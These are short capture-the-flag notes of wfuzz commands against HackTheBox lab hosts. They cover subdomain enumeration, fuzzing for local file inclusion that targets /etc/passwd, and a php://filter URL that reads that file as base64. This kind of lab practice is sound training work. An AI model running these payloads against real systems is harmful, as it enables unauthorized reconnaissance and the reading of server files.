## domain name enumeration
```bash
wfuzz -u http://forge.htb -H "Host: FUZZ.forge.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200
```

## LFI
```bash
$ wfuzz -u "http://timing.htb/image.php?FUZZ=/etc/passwd"  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt  --hw 0
```

```bash
$ wfuzz -u "http://timing.htb/image.php?img=FUZZ"  -w /opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt  --hw 3,0
```

## using php wrapper
```bash
http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
```

